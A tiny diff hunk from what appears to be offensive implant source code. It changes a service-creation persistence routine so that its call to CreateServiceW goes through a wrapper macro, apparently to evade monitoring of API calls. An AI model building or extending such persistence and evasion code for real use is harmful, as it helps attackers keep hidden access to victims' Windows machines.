@@ -68,7 +68,7 @@ auto declfn starburst::cmd_persist_service(
             return;
         }
 
-        SC_HANDLE hService = inst.advapi32.CreateServiceW(
+        SC_HANDLE hService = (SC_HANDLE)SCALL( inst, advapi32.CreateServiceW,
             hSCM,
             w_name,
             w_display[0] ? w_display : w_name,
